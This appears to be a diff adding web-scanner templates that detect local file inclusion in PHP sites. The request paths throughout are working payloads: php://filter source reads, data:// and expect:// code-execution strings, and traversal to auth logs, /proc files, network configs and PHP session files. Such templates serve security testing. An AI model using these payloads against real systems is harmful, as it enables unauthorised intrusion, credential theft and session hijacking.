@@ -1,0 +1,151 @@
+id: lfi-php-wrappers
+info:
+  name: LFI PHP Wrappers
+  author: AniipID
+  severity: high
+  description: Detects LFI using various PHP stream wrappers
+  tags: lfi,php,wrapper
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?file=php://filter/read=convert.base64-encode/resource=config"
+      - "{{BaseURL}}?file=php://filter/convert.base64-encode/resource=../config"
+      - "{{BaseURL}}?page=php://filter/zlib.deflate/convert.base64-encode/resource=index"
+      - "{{BaseURL}}?inc=php://filter/read=string.rot13/resource=index"
+      - "{{BaseURL}}?file=expect://id"
+      - "{{BaseURL}}?file=php://input"
+    matchers:
+      - type: regex
+        regex:
+          - "^[A-Za-z0-9+/=]{50,}"
+          - "PD9waHA"
+          - "uid="
+        condition: or
+        name: "php-wrapper-lfi"
+---
+id: lfi-data-url
+info:
+  name: LFI via data:// URL
+  author: AniipID
+  severity: critical
+  description: Detects LFI using PHP data URL scheme for code execution
+  tags: lfi,rce,data-url
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg=="
+      - "{{BaseURL}}?page=data://text/plain,<?php%20system('id');?>"
+    matchers:
+      - type: word
+        words:
+          - "uid="
+          - "www-data"
+        condition: or
+        name: "data-url-rce"
+---
+id: lfi-var-log
+info:
+  name: LFI via /var/log Files
+  author: AniipID
+  severity: high
+  description: Detects LFI accessing various log files
+  tags: lfi,logs,credential
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?file=../../../var/log/auth.log"
+      - "{{BaseURL}}?file=../../../var/log/messages"
+      - "{{BaseURL}}?file=../../../var/log/syslog"
+      - "{{BaseURL}}?file=../../../var/log/dpkg.log"
+      - "{{BaseURL}}?file=../../../var/log/bootstrap.log"
+      - "{{BaseURL}}?file=../../../var/log/mail.log"
+      - "{{BaseURL}}?file=../../../var/log/faillog"
+      - "{{BaseURL}}?file=../../../var/log/lastlog"
+    matchers:
+      - type: word
+        words:
+          - "Accepted password"
+          - "Failed password"
+          - "authentication failure"
+          - "sudo"
+          - "session opened"
+          - "sshd"
+          - "kernel"
+        condition: or
+        name: "log-file-leaked"
+---
+id: lfi-proc-cmdline
+info:
+  name: LFI via /proc/cmdline
+  author: AniipID
+  severity: medium
+  description: Detects LFI accessing kernel boot parameters
+  tags: lfi,proc,kernel
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?file=../../../proc/cmdline"
+      - "{{BaseURL}}?file=../../../proc/version"
+      - "{{BaseURL}}?file=../../../proc/cpuinfo"
+      - "{{BaseURL}}?file=../../../proc/meminfo"
+      - "{{BaseURL}}?file=../../../proc/uptime"
+    matchers:
+      - type: word
+        words:
+          - "BOOT_IMAGE"
+          - "ro root"
+          - "Linux version"
+          - "processor"
+          - "MemTotal"
+        condition: or
+        name: "proc-info-leaked"
+---
+id: lfi-net-config
+info:
+  name: LFI Network Configuration
+  author: AniipID
+  severity: high
+  description: Detects LFI accessing network configuration files
+  tags: lfi,network,config
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?file=../../../etc/network/interfaces"
+      - "{{BaseURL}}?file=../../../etc/resolv.conf"
+      - "{{BaseURL}}?file=../../../etc/hostname"
+      - "{{BaseURL}}?file=../../../etc/hosts.allow"
+      - "{{BaseURL}}?file=../../../etc/hosts.deny"
+      - "{{BaseURL}}?file=../../../proc/net/tcp"
+      - "{{BaseURL}}?file=../../../proc/net/arp"
+    matchers:
+      - type: word
+        words:
+          - "iface"
+          - "nameserver"
+          - "hostname"
+          - "ALL:"
+          - "sl local"
+        condition: or
+        name: "net-config-leaked"
+---
+id: lfi-php-session
+info:
+  name: LFI PHP Session File
+  author: AniipID
+  severity: high
+  description: Detects LFI accessing PHP session files for session hijacking
+  tags: lfi,php,session
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?file=../../../var/lib/php/sessions/sess_*"
+      - "{{BaseURL}}?file=../../../tmp/sess_*"
+      - "{{BaseURL}}?file=../../../var/lib/php/session/sess_*"
+    matchers:
+      - type: word
+        words:
+          - "user|s:"
+          - "admin|b:1"
+          - "username|s:"
+        condition: or
+        name: "php-session-leaked"
